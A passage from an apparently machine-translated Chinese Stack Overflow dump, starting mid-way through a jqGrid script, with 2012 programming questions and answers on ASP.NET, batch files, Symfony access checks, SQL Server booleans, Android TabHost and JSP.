                        { name: 'Region_ID', index: 'Region_ID', width: 50, stype: 'text', sortable: true, editable: false },
                        { name: 'Region_Name', index: 'Region_Name', width: 100, editable: false },
                        { name: 'ActionDate', index: 'ActionDate', width: 80, editable: false, formatter: "date" },
                        { name: 'Field', index: 'Field', width: 100, align: "right", editable: false },
                        { name: 'OldValue', index: 'OldValue', width: 100, align: "right", editable: false },
                        { name: 'NewValue', index: 'NewValue', width: 100, align: "right", editable: false },
                        { name: 'TableName', index: 'TableName', width: 100, sortable: true, editable: false },
                        { name: 'Who', index: 'Who', width: 110, sortable: true, editable: false },
                        { name: 'Comment', index: 'Comment', width: 110, sortable: true, editable: false }
                      ],
            rowNum: 20,
            mtype: 'GET',
            loadonce: true,
            rowList: [10, 20, 30,40,50],
            pager: '#jQGridDemoPager',
            sortname: 'TableID',
            viewrecords: true,
            sortorder: 'desc',
            caption: "",
            editurl: '../Handlers/JQGridHandler.ashx'
        });

        $('#jQGridDemo').jqGrid('navGrid', '#jQGridDemoPager',
                   {
                       //edit: true,
                       //add: true,
                       //del: true,
                       search: true,
                       searchtext: "Search"
                       //addtext: "Add",
                       //edittext: "Edit",
                       //deltext:"Delete"
                   },
                   {   //EDIT
                       //                       height: 300,
                       //                       width: 400,
                       //                       top: 50,
                       //                       left: 100,
                       //                       dataheight: 280,
                       closeOnEscape: true,//Closes the popup on pressing escape key
                       reloadAfterSubmit: true,
                       drag: true,
                       afterSubmit: function (response, postdata) {
                           if (response.responseText == "") {

                               $(this).jqGrid('setGridParam', { datatype: 'json' }).trigger('reloadGrid');//Reloads the grid after edit
                               return [true, '']
                           }
                           else {
                               $(this).jqGrid('setGridParam', { datatype: 'json' }).trigger('reloadGrid'); //Reloads the grid after edit
                               return [false, response.responseText]//Captures and displays the response text on th Edit window
                           }
                       },
                       //editData: {
                       //    EmpId: function () {
                       //        var sel_id = $('#jQGridDemo').jqGrid('getGridParam', 'selrow');
                       //        var value = $('#jQGridDemo').jqGrid('getCell', sel_id, '_id');
                       //        return value;
                       //    }
                       //}
                   },
                   {
                       closeAfterAdd: true,//Closes the add window after add
                       afterSubmit: function (response, postdata) {
                           if (response.responseText == "") {

                               $(this).jqGrid('setGridParam', { datatype: 'json' }).trigger('reloadGrid')//Reloads the grid after Add
                               return [true, '']
                           }
                           else {
                               $(this).jqGrid('setGridParam', { datatype: 'json' }).trigger('reloadGrid')//Reloads the grid after Add
                               return [false, response.responseText]
                           }
                       }
                   },
                   {   //DELETE
                       closeOnEscape: true,
                       closeAfterDelete: true,
                       reloadAfterSubmit: true,
                       closeOnEscape: true,
                       drag: true,
                       afterSubmit: function (response, postdata) {
                           if (response.responseText == "") {

                               $("#jQGridDemo").trigger("reloadGrid", [{ current: true}]);
                               return [false, response.responseText]
                           }
                           else {
                               $(this).jqGrid('setGridParam', { datatype: 'json' }).trigger('reloadGrid')
                               return [true, response.responseText]
                           }
                       },
                       //delData: {
                       //    EmpId: function () {
                       //        var sel_id = $('#jQGridDemo').jqGrid('getGridParam', 'selrow');
                       //        var value = $('#jQGridDemo').jqGrid('getCell', sel_id, '_id');
                       //        return value;
                       //    }
                       //}
                   },
                   {//SEARCH
                       closeOnEscape: true
                   }
            );

    </script> 
```

我通过右键单击项目创建了一个通用处理程序，并将新项目添加为通用处理程序并将其命名为 JQGridHandler.ashx，然后将其放在名为 Handlers 的文件夹中以进行 ajax 调用。

**JqG​​ridHandler.ashx.cs:-**

```
public class JQGridHandler : IHttpHandler
    {
        History myHistory = new History();    

        public void ProcessRequest(HttpContext context)
        {
            try {                   
    List<HistoryDetails> myHistoryDetails = new List<HistoryDetails>();
            myHistoryDetails = myHistory.GetAllHistoryDetails();
            var jsonSerializer = new JavaScriptSerializer();   
         context.Response.Write(jsonSerializer.Serialize(myHistoryDetails));
            }
            catch(Exception ex)
            {

            }
        }

        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
    } 
```

**History.aspx.cs:-** 我正在创建一个名为 HistoryDe​​tails 的通用类，它具有所有必需的属性。然后我调用业务 logic.GetallHistoryDe​​tails()，它使用存储过程从数据库中获取记录

```
 public List<HistoryDetails> GetAllHistoryDetails()
        {
            List<HistoryDetails> myHistoryDetails = new List<HistoryDetails>();
            try
            {
                myHistoryDetails = BusinessLogic.GetAllHistoryDetails(IdVal);                
            }
            catch(Exception ex)
            {

            }
            return myHistoryDetails;
        } 
```

**参考资料：-** [https://www.codeproject.com/Articles/609442/Using-JqGrid-in-ASP-NET](https://www.codeproject.com/Articles/609442/Using-JqGrid-in-ASP-NET)

# c# - Microsoft Push Notification Services 生成的 URI 字符串的最大长度是多少？

> ID：10347389
> 
> 赞同：6
> 
> 时间：2012-04-27T08:33:56.913
> 
> 标签：c#, windows-phone-7, push-notification, mpns

有人可以指导我从 Microsoft PUSH Notification Services 生成的 URI 的长度吗？

我得到的 URL 字符串长度为 120。我只是想确保每当我的 Windows 手机应用程序从 MPNS 接收到新的 URI 时，它的长度总是 120 字节。如果它可以更长，那么它可以有多长？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-12-09T16:37:03.780

Channel URIs may be up to 1,024 characters long.

[http://blogs.windows.com/windows_phone/b/wpdev/archive/2013/10/22/recommended-practices-for-using-microsoft-push-notification-service-mpns.aspx](http://blogs.windows.com/windows_phone/b/wpdev/archive/2013/10/22/recommended-practices-for-using-microsoft-push-notification-service-mpns.aspx)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-11-12T20:09:58.627

Internet Explorer 中的最大 URL 长度为 2,083 个字符

[http://support.microsoft.com/kb/208427](http://support.microsoft.com/kb/208427)

在移动浏览领域，URL 限制可以低很多。许多手机仍然不支持超过 128、256 或 512 个字符的 URL，特别是 WAP 设备（与带有完整 HTTP 浏览器的设备相反）我建议您使用 256 个字符

# joomla1.5 - joomla 中的 Itemid() 有什么用

> ID：10347390
> 
> 赞同：0
> 
> 时间：2012-04-27T08:33:58.027
> 
> 标签：joomla1.5

我是 joomla 1.5 的新手，我在阅读更多链接上使用 itemid，但不了解 itemid 的使用，因为如果它用于在 menulink 虎钳中显示文章，我有 4 个菜单，但我仍在写一篇文章&id=14 & itemid=5 仍然显示文章。即使我只有 4 个菜单，

```
how it show my article on another page it should be error 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:48:43.473

itemid 是菜单的 ID。所以它基本上是菜单。你可以去 joomla 表查看表 jos_menu 的 id 字段有 itemid。菜单可以与多个事物相关联。例如组件外部链接等。当您访问菜单时，它会获取其 itemid 以将其与另一个菜单分开。

# text - 批量添加标题到 ASCII 文本文件，可变长度

> ID：10347393
> 
> 赞同：3
> 
> 时间：2012-04-27T08:34:14.667
> 
> 标签：text, batch-file, ascii

我需要将一个简单的单行标题添加到一批 ascii (.asc) 文件中，长度可变（每几百万行），并使用相同的文件名保存。我有大量这些文件。这最好用 Windows 批处理文件完成吗？如果是这样，任何人都可以帮助解释如何？

在此先感谢-我知道这应该很简单，并且已经搜索了答案，但没有找到任何看起来很正确的东西...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-28T01:36:16.257

虽然 jeb 的回答解决了这个问题，但我认为下面的方法应该在处理大量文件时运行得更快，因为它使用较少的命令和“批量重命名”操作：

```
for %%F in (*.txt) do (
   echo Working on %%F
   copy header.template + "%%F" "%%~nF.tmp"
)
move /Y *.tmp *.txt 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:42:37.530

由于您只能将某些内容附加到文件中，因此您不能通过简单的操作为文本添加前缀。
但是你可以：

1.  首先将您的标题复制到新文件（`copy header.template header.tmp`）
2.  将原始文件复制到新文件 ( `type original.txt >> header.tmp`)
3.  删除您的原始文件 ( `del original.txt`)
4.  将新文件重命名为原始名称 ( `ren header.tmp original.txt`)

**编辑：**

```
for %%F in (*.txt) DO (
  echo Working on %%F
  copy header.template newFile.tmp
  type "%%~F" >> newFile.tmp
  del "%%~F"
  copy newFile.tmp "%%~F"
) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T08:43:12.007

如果不重写整个文件，就无法做到这一点。

未经测试的批处理文件：

```
move source.asc source.asc.tmp
echo "header" > source.asc
type source.asc.tmp >> source.asc
del source.asc.tmp 
```

根据其他答案，可以像这样完成多个文件（这次实际测试过）：

```
for %%F in (*.asc) DO (
    move "%%F" tmp.txt
    echo header > "%%F"
    type tmp.txt >> "%%F"
    del tmp.txt
) 
```

# c# - 如何将数据传递给 ASP.NET WebAPI

> ID：10347396
> 
> 赞同：0
> 
> 时间：2012-04-27T08:34:47.913
> 
> 标签：c#, http, asp.net-web-api

我一直在 asp.net 网站上使用新的 WebAPI。我使用可以获取的简单字符串创建了一些示例。我想看看我现在是否可以 POST 和 PUT 到该服务。

我正在寻找如何将对象添加到请求中，然后我可以从 .net 3.5 控制台应用程序中发布或 PUT。我要发送的对象只是一个简单的用户类，其中包含姓名、姓氏和用户 ID。

从我的测试来看，我似乎可以序列化它并通过 URI 发送它，但这似乎不太正确。我注意到这些请求有标题，我可以把数据放在那里吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T09:27:19.990

使用 .NET 3.5，我认为没有很多优雅的选项，但使用此代码的`WebClient`工作（您需要添加对 System.Web.Extensions 的引用）：

```
WebClient client = new WebClient();
JavaScriptSerializer serializer = new JavaScriptSerializer();
var data = serializer.Serialize(new {Name = "Ali", Title = "Ostad"});
client.Headers[HttpRequestHeader.ContentType] = "application/json";
var downloadString = client.UploadString("http://localhost:59174/api/values", data); // value is "Ali" 
```

这是控制器动作：

```
// POST /api/values
public string Post(JsonValue value)
{
    return value.AsDynamic().Name;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:44:05.743

查看 NuGet 上的[HttpClient](http://nuget.org/packages/HttpClient)。这使得通过 http 做大多数事情变得容易。

这[是一个使用它的例子](http://blog.alexonasp.net/post/2011/03/21/POSTing-Json-data-using-the-HttpClient-from-WCF-Web-API.aspx)。

# ios - 在没有看到扬声器图标的情况下以编程方式更改 iPhone 上的播放音量

> ID：10347406
> 
> 赞同：1
> 
> 时间：2012-04-27T08:35:29.097
> 
> 标签：ios, volume

我想以编程方式更改 iPhone 播放音量。我在网上找到了这段代码：

```
MPMusicPlayerController *musicPlayer = [MPMusicPlayerController iPodMusicPlayer];

musicPlayer.volume = 1.0; 
```

但是，它会弹出扬声器图标的[视觉覆盖](http://i.stack.imgur.com/FRzht.png)，这是我不想要的。我能想到的一种方法是检查音量是否已更改，然后尝试删除该覆盖。

有没有办法实现这一点或改变音量而不出现覆盖？

# iphone - EGOTextView 问题

> ID：10347408
> 
> 赞同：1
> 
> 时间：2012-04-27T08:35:35.963
> 
> 标签：iphone, ios, ios4

```
EGOTextView *view = [[EGOTextView alloc]initWithFrame:
      CGRectMake(5.0f,5.0f,310.0f,220.0f)];
      view.delegate = (id<EGOTextViewDelegate>)self;
      view.layer.borderWidth = 1.0f;
      view.layer.cornerRadius = 15;
      //view.clipsToBounds = YES;
      view.backgroundColor = [UIColor whiteColor];
      view.returnKeyType = UIReturnKeyDone;  
      //view.contentInset = UIEdgeInsetsZero;
      [self.view addSubview:view];
      self.egoTextView = view;
      self.egoTextView.font = [UIFont fontWithName:@"Helvetica" size:25.0f];
      self.egoTextView.attributedString = string;
      [view release];  
      [view becomeFirstResponder]; 
```

上面的代码创建了文本视图，但前两行被隐藏并且不可见。我需要向下滚动才能查看它。

此外，文本集最初不采用提到的字体大小。只有当我输入文本时，我提到的字体大小才会生效。

那么我需要如何解决这个问题。非常感谢你的帮助

# php - Symfony 中用户安全页面的最佳方法是什么？

> ID：10347412
> 
> 赞同：2
> 
> 时间：2012-04-27T08:35:58.883
> 
> 标签：php, symfony1, symfony-1.4

我在数据库中有例如表​​：

```
News:
id | user_id | title | body 
```

和 CRUD：

```
public function executeIndex(sfWebRequest $request)
public function executeNew(sfWebRequest $request)
public function executeShow(sfWebRequest $request)
public function executeCreate(sfWebRequest $request)
public function executeEdit(sfWebRequest $request)
public function executeUpdate(sfWebRequest $request)
public function executeDelete(sfWebRequest $request)
protected function processForm(sfWebRequest $request, sfForm $form) 
```

确保这一点的最佳方法是什么？我希望 USER 只能**编辑、更新**和**删除**自己的**News**。我可以做到这一点 - 获取当前 ID 用户并与来自新闻和下一个重定向的 user_id 进行比较。也许我可以用 preExecute 或 yaml 文件来做这个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T09:31:14.293

I used to do such a thing.

I choose to extend User class (`myUser.class.php` in application lib directory) with method `can($what, Doctrine_Record $with)`, also declared few types of update types, like: const `UPDATE = 'update';` and others, in the same way.

After that in `preExecute()` I've retrieved the currently requested object, in your case - News object, and calling `if (!$this->getUser()->can(myUser::UPDATE, $news)) { /* redirect or whatever */ }`.

As you can see, it's very easy readable and maintanable.

This way you have all access logic in one, method - `can()`, where you can specify any logic you need.

Hope, that helps you.

For your example, `can()` method would be something like:

```
switch(get_class($with))
{
    case 'News':
        if ($with->getUserId() != $this->getProfile()->getId()) // Assuming that getProfile() gives me a User class which News record is referenced
        {
            switch ($what)
            {
                case self::UPDATE:
                    return false;
                case self::DELETE:
                    return false;
            }
        }
        else
        {
            return true; // The user is owner - he can do whatever he want.
        }
        break;
    default:
        return false; // or true, don't know what you need
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-30T11:41:29.867

我做了很多相同的事情。但我没有扩展 sfUser 类。我使用了 symfony 的过滤器链[http://www.symfony-project.org/book/1_2/06-Inside-the-Controller-Layer#chapter_06_filters](http://www.symfony-project.org/book/1_2/06-Inside-the-Controller-Layer#chapter_06_filters)并编写了我自己的能够解析路由配置的 SecurityFilter。

我在 routing.yml 的特定路由中添加了一个选项

```
contact_list:
  url: /contacts/:usergroup
  param: { module: contacts, action: index }
    options: { securityManager: UsergroupListSecurityManager } 
```

例如： securityFilter 现在使用 UsergroupListSecurityManager 的实例来确定是否允许显示页面。

所以我能够设置默认的“securityManager”并在特定路由上定义任何特定的“securityManagers”——我还能够在不同的路由和其他上下文中重用一些“securityManager”（创建上下文菜单或工具栏）。

# ios - 目前无法购买此商品

> ID：10347413
> 
> 赞同：9
> 
> 时间：2012-04-27T08:36:11.657
> 
> 标签：ios, itunes, in-app-purchase

我尝试在沙盒环境的ios游戏中购买东西，使用测试用户，输入appid和密码后，我得到消息：

" 暂时无法购买此商品。此商品正在修改中，请稍后再试"

昨天还好好的，我什么都没改，今天就不行了。我不确定是什么原因。

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T14:06:01.400

发生此错误有两种可能的方式。

1.  如果您在 IAP 上更改了产品 ID 的详细信息，可能需要更多时间来处理

2.  编码和用户控制由您在单击“购买”询问苹果 ID、密码后单击警报上的购买由 StoreKit 框架控制，这可能是在 App Store 上处理时的服务器问题。

# ruby-on-rails - 带有回形针的 Rails 图像生成和附件

> ID：10347416
> 
> 赞同：-1
> 
> 时间：2012-04-27T08:36:20.497
> 
> 标签：ruby-on-rails, image-processing

在我当前的项目中，我需要从另外两个图像中创建一个图像（一个用作背景，另一个是“放置”），并将其附加到一个对象上。我习惯用回形针做附件部分，但我还没有处理过图像生成。我知道回形针可以做一些类似的事情（调整图片大小等），但我不知道该怎么做。回形针本身是否有足够的空间来做到这一点？那么给我什么工具呢？如果没有，首选的选项是什么？

谢谢你的时间！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:59:53.990

Paperclip 是一个很酷的插件，它具有几乎所有必要的功能，如调整大小、裁剪和存储不同大小的图像。我已经使用它很长时间了，从未遇到过任何问题。它也为您提供了远程文件上传的选项（如 amazon s3）。Attachment-foo 也是一个类似的插件，具有相同的功能集。但是，如果您认为回形针不能满足您的要求，您可以尝试一下[Carrierwave](https://github.com/jnicklas/carrierwave)，它比回形针更有趣，而且功能也很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T08:24:31.200

我们最终`Paperclip.run`使用 imagemagick 生成图像。

# c++ - C++ OpenGL ES 2.0 矩阵变换 - 新手

> ID：10347417
> 
> 赞同：1
> 
> 时间：2012-04-27T08:36:20.520
> 
> 标签：c++, matrix, opengl-es-2.0

我正在尝试开发 OpenGL ES 2.0，而且我几乎是一个 OpenGL 新手。我有一个简单的程序，目前只在原点绘制一个红色正方形，我想使用矩阵将其从原点移动到屏幕中心。我相信到目前为止我所做的一切都是正确的，但我必须遗漏一些东西，因为当我将矩阵应用于着色器时，我只是得到一个空白屏幕。

着色器：

```
const char vShaderStr[] = "attribute vec4 a_position; \n"
        "attribute vec4 a_colour; \n"
        "varying vec4 v_colour; \n"
        "uniform mat4 u_transformation; \n"
        "void main() \n"
        "{ \n"
        "       v_colour = a_colour; \n"
        "       gl_Position = u_transformation * a_position; \n"
        "} \n";
const char fShaderStr[] = "varying vec4 v_colour; \n"
        "void main() \n"
        "{ \n"
        "       gl_FragColor = v_colour; \n"
        "} \n"; 
```

创建矩阵并发送到着色器：

```
transformationMatrix = glGetUniformLocation(programObject, "u_transformation");
...
GLfloat vMatrix[] = {
        0.0f, 0.0f, 0.0f, 0.0f,
        0.0f, 0.0f, 0.0f, 0.0f,
        0.0f, 0.0f, 0.0f, 0.0f,
        -0.5f, -0.5f, 0.0f, 1.0f,
    };
glUniformMatrix4fv(transformationMatrix, 1, GL_FALSE, vMatrix); 
```

在将其发送到着色器之前，我是否必须对这个矩阵进行一些数学运算？如果有怎么办？我觉得我错过了对这里大多数人来说显而易见的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:43:03.737

您的矩阵可能是错误的。假设其他一切都设置正确，这将是正确的矩阵：

```
GLfloat vMatrix[] = {
    1.0f, 0.0f, 0.0f, 0.0f,
    0.0f, 1.0f, 0.0f, 0.0f,
    0.0f, 0.0f, 1.0f, 0.0f,
    -0.5f, -0.5f, 0.0f, 1.0f,
}; 
```

# permissions - 在多用户 hadoop 集群上设置 Pig

> ID：10347419
> 
> 赞同：1
> 
> 时间：2012-04-27T08:36:22.127
> 
> 标签：permissions, hadoop, apache-pig

我已经设置了一个多用户 Hadoop 集群，其中有一个管理员用户可以访问启动/停止 Hadoop 集群。我可以使用这个管理员用户运行猪作业。但是，任何其他用户都无法在集群上运行 pig 脚本。在做了一些阅读后，我发现可能`pig.temp.dir`需要在猪属性中正确设置变量。但我尝试在 HDFS 中创建 /tmp 目录并授予它 777 权限。然后，我也收到权限错误。请参阅以下错误。令人惊讶的是，它说：`inode="home"`错误，而我在 pig-properties 中指定了 /tmp 目录。

```
2012-04-27 08:20:57,113 [main] ERROR org.apache.pig.tools.pigstats.SimplePigStats - ERROR 2997: Unable to recreate exception from backend error: org.apache.hadoop.security.AccessControlException: org.apache.hadoop.security.AccessControlException: Permission denied: user=tavasthi, access=WRITE, inode="home":dsslmn:supergroup:rwxr-xr-x 
```

# sql - 在 mssql 中评估布尔返回值 - 可能吗？

> ID：10347420
> 
> 赞同：2
> 
> 时间：2012-04-27T08:36:23.577
> 
> 标签：sql, sql-server

我正在努力：

```
select tbl.*, (true and true) as booleanTest
from tbl 
```

这 ms-sql 似乎并不欣赏。**（关键字“和”附近的语法不正确）**

因无知而幸福，我认为这是标准的 ANSI 东西。

Q：以上可以用更通用的sql语法来表达吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T08:45:37.693

SQL Server 不支持标准 SQL 的`BOOLEAN`数据类型，记住它是一种非常奇怪的布尔值，它具有三个值！代替`BOOLEAN`文字值，您必须替换为所需真值的表达式，例如

```
( 1 = 1 )      -- TRUE
( 0 = 1 )      -- FALSE
( 1 = NULL )   -- UNKNOWN 
```

我通常写这样的代码（按照你的例子）：

```
SELECT tbl.*, 
       CASE 
          WHEN     ( ( 1 = 1 ) AND ( 1 = 1 ) ) THEN 'TRUE'
          WHEN NOT ( ( 1 = 1 ) AND ( 1 = 1 ) ) THEN 'FALSE'
          ELSE 'UNKNOWN'
       END AS result
  FROM tbl; 
```

* * *

正如@Diego 所暗示的那样（我认为！），在传统逻辑中，我们可以应用[幂等](http://en.wikipedia.org/wiki/Idempotence) [重写规则](http://en.wikipedia.org/wiki/Rewriting)，它指出

```
( P AND P )   <= is equivalent to =>   ( P ) 
```

碰巧，该规则适用于 SQL 的三值逻辑。

例如，在 SQL Server 中的案例证明`( UNKNOWN AND UNKNOWN ) <=> UNKNOWN`：

```
SELECT CASE 
          WHEN     ( 1 = NULL) AND ( 1 = NULL ) THEN 'TRUE'
          WHEN NOT ( 1 = NULL) AND ( 1 = NULL ) THEN 'FALSE'
          ELSE 'UNKNOWN'
       END AS result 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:44:47.943

你期望达到什么目标？SQl 上没有布尔值，因此您可以执行以下操作：

```
declare @a bit
declare @b bit

set @a=0
set @b=1

select  
    case
        when  @a=@b then 1 
        when  not @a=@b  then 0
        else null
    end as Bool_test 
```

可能的结果：

```
@a              @b        Result
0               0           1
0               1           0
1               0           0
1               1           1
NUll         any_value     NULL
any_value       NULL       NULL 
```

# c# - 如何在 SqlDataSource selectCommand 的条件下传递属性值？

> ID：10347423
> 
> 赞同：4
> 
> 时间：2012-04-27T08:36:55.597
> 
> 标签：c#, asp.net, sqldatasource

我的 page2.aspx.cs 页面中有一个属性

```
public int? Id
{
        get
        {
            if (ViewState[Page1.Id] != null)
                return Convert.ToInt32(ViewState[Page1.Id]);
            else return null;
        }
        set
        {
            ViewState[Id] = value;
        }
    } 
```

我正在使用 asp: 数据源：

```
<asp:SqlDataSource ID="SqlDataSourceGridView" runat="server" 
   ProviderName="System.Data.SqlClient" 
   SelectCommand="SELECT [Name],[Address] FROM [Table_Emp] where Id = need to pass property value >" 
   OnSelecting="SqlDataSourceGridView_Selecting">
</asp:SqlDataSource> 
```

我想在我的 where 条件下传递 Id。这怎么可能。

请有人帮助我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T08:39:21.870

来看看

```
 <asp:sqlDataSource ID="EmployeeDetailsSqlDataSource" 
   SelectCommand="SELECT EmployeeID, LastName, FirstName FROM Employees WHERE EmployeeID = @EmpID"

   InsertCommand="INSERT INTO Employees(LastName, FirstName) VALUES (@LastName, @FirstName); 
                  SELECT @EmpID = SCOPE_IDENTITY()"
   UpdateCommand="UPDATE Employees SET LastName=@LastName, FirstName=@FirstName 
                    WHERE EmployeeID=@EmployeeID"
   DeleteCommand="DELETE Employees WHERE EmployeeID=@EmployeeID"

   ConnectionString="<%$ ConnectionStrings:NorthwindConnection %>"
   OnInserted="EmployeeDetailsSqlDataSource_OnInserted"
   RunAt="server">

   <SelectParameters>
     <asp:Parameter Name="EmpID" Type="Int32" DefaultValue="0" />
   </SelectParameters>

   <InsertParameters>
     <asp:Parameter Name="EmpID" Direction="Output" Type="Int32" DefaultValue="0" />
   </InsertParameters>

 </asp:sqlDataSource> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:51:46.580

1）插入带有参数名称的占位符，如`@Id`您选择查询

2）将参数的参数规范添加`Id`到`<SelectParameter>`SqlDataSource 部分

```
<asp:SqlDataSource ID="SqlDataSourceGridView" runat="server" 
     ProviderName="System.Data.SqlClient" 
     SelectCommand="SELECT [Name],[Address] FROM [Table_Emp] where Id = @Id" 
     OnSelecting="SqlDataSourceGridView_Selecting">

    <SelectParameters>
         <asp:Parameter Name="Id" Type="Int32" />
    </SelectParameters>

</asp:SqlDataSource> 
```

3）在选择事件方法中将参数值放入命令

```
protected void SqlDataSourceGridView_Selecting(object sender, SqlDataSourceSelectingEventArgs e)
{
    e.Command.Parameters["@Id"].Value = (int)(Id ?? 0); // nullable ind is not applicable here
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:25:06.230

您可以从后面的代码中设置它。只需在您的 sql 数据源中定义一个选择参数，例如

```
 <asp:SqlDataSource ID="SqlDataSourceGridView" runat="server" 
   ProviderName="System.Data.SqlClient" 
   SelectCommand="SELECT [Name],[Address] FROM [Table_Emp] where Id =@id" 
   OnSelecting="SqlDataSourceGridView_Selecting">
  <SelectParameters>
        <asp:Parameter Name="@id" Type="Int32" />
    </SelectParameters> 
```

然后在你后面的代码中你可以手动设置参数，比如

```
SqlDataSourceGridView.SelectParameters["@id"].DefaultValue = yourValue;
Gridview1.DataBind(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T08:47:16.497

您必须在 SQLDataSource 下使用 Node。

看看这里：[MSDN 参考](http://msdn.microsoft.com/en-us/library/z72eefad.aspx)或[教程](http://www.asp.net/web-forms/tutorials/data-access/accessing-the-database-directly-from-an-aspnet-page/using-parameterized-queries-with-the-sqldatasource-cs)

```
<asp:SqlDataSource ID="SqlDataSourceGridView" runat="server" 
   ProviderName="System.Data.SqlClient" 
   SelectCommand="SELECT [Name],[Address] FROM [Table_Emp] where Id = need to pass property value >" 
   OnSelecting="SqlDataSourceGridView_Selecting">

   <SelectParameters>
     <asp:Parameter Name="ParameterName" />
   </SelectParameters>

</asp:SqlDataSource> 
```

OT：您的属性 ID 有错误。您设置了 ViewState[Id] 但您尝试检索 Viewstate[Page.id]

# android - Android tabHost 是隐形的？为什么它不会与这个 XML 一起显示？

> ID：10347424
> 
> 赞同：3
> 
> 时间：2012-04-27T08:37:08.280
> 
> 标签：android, xml, tabs, android-tabhost, tabwidget

在 Eclipse 上的 XML 编辑器中，我看到了 tabhost，它看起来正是我想要的，但是当我运行它时，我根本看不到 tabHost，我怎样才能确保它是可见的？

这是我的 XML。再次，编辑器显示它，但是当我运行它时它没有，膨胀它的活动还没有做太多，只需更改两个文本字段。有任何想法吗？

```
<?xml version="1.0" encoding="utf-8"?>
<GridLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:columnCount="2"
    android:orientation="vertical" >

    <TextView
        android:id="@+id/name"
        android:layout_width="238dp"
        android:layout_column="0"
        android:layout_columnSpan="2"
        android:layout_gravity="top|left"
        android:layout_marginTop="7dp"
        android:layout_marginLeft="3dp"
        android:layout_row="0"
        android:gravity="top"
        android:maxLines="1"
        android:padding="3dp"
        android:text="Motherfucking Acer Laptop X314134"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <View
        android:layout_height="2dp"
        android:layout_width="fill_parent"
        android:layout_row="1"
        android:layout_column="0"
        android:layout_columnSpan="2"
        android:background="#FF000000"
        />

    <TabHost
        android:id="@android:id/tabhost"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_column="0"
        android:layout_columnSpan="2"
        android:layout_gravity="center_horizontal"
        android:layout_row="2" >

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical" >

            <TabWidget
                android:id="@android:id/tabs"
                android:layout_width="match_parent"
                android:layout_height="wrap_content" >
            </TabWidget>

            <FrameLayout
                android:id="@android:id/tabcontent"
                android:layout_width="match_parent"
                android:layout_height="match_parent" >

                <LinearLayout
                    android:id="@+id/Info"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent" >
                </LinearLayout>

                <LinearLayout
                    android:id="@+id/Specs"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent" >
                </LinearLayout>

                <LinearLayout
                    android:id="@+id/Fotos"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent" >
                </LinearLayout>

                <LinearLayout
                    android:id="@+id/Prijzen"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent" >
                </LinearLayout>
            </FrameLayout>
        </LinearLayout>
    </TabHost>

    <TextView
        android:id="@+id/score"
        android:layout_column="1"
        android:layout_marginRight="3dp"
        android:layout_marginTop="4dp"
        android:layout_gravity="right"
        android:layout_row="0"
        android:gravity="center_vertical"
        android:padding="3dp"
        android:text="100%"
        android:textSize="24sp" />

    <Space
        android:id="@+id/space2"
        android:layout_width="1dp"
        android:layout_height="40dp"
        android:layout_column="0"
        android:layout_gravity="left"
        android:layout_row="0" />

    <Space
        android:id="@+id/space1"
        android:layout_width="1dp"
        android:layout_height="415dp"
        android:layout_column="0"
        android:layout_gravity="left"
        android:layout_row="2" />

</GridLayout> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-27T09:53:29.153

您必须以编程方式执行此操作，例如：

```
 tabhost = (TabHost) findViewById(android.R.id.tabhost);
    tabhost.setup();
    TabSpec ts = tabhost.newTabSpec("tag1"); 
    ts.setContent(R.id.tab1);
    ts.setIndicator("First Tab");
    tabhost.addTab(ts);

    ts = tabhost.newTabSpec("tag2"); 
    ts.setContent(R.id.tab2);
    ts.setIndicator("Second Tab");  
    tabhost.addTab(ts);
    ts= tabhost.newTabSpec("tag3");
    ts.setContent(R.id.tab3);
    ts.setIndicator("Third Tab");
    tabhost.addTab(ts); 
```

# java - 浏览器上的代码打印 (Firefox)

> ID：10347429
> 
> 赞同：2
> 
> 时间：2012-04-27T08:37:18.070
> 
> 标签：java, jsp, firefox

![在此处输入图像描述](../Images/04be2c7297793c968791f6e836ebe0cb.png)

我正在使用此代码制作用户登录表单，问题是我能够从 Internet Explorer 登录，但是当我从 Firefox 登录时，相同的代码会在屏幕上打印代码的 HTML 版本。

此代码在登录后打印待处理列表：

```
 <%@ page language = "java" import="java.util.Iterator"  import="java.util.ArrayList"     import="java.lang.*" contentType = "text/html; charset = ISO-8859-1"
     %>
<%@ page errorPage="/error.jsp" %>
<%    
    response.setHeader("Pragma", "no-cache");
    response.setHeader("Cache-Control", "no-store");
    response.setHeader("Expires", "0");
    response.setDateHeader("Expires", -1);
    //session = request.getSession(false);
    //               session.invalidate();
    //             session = request.getSession(true);
 %>

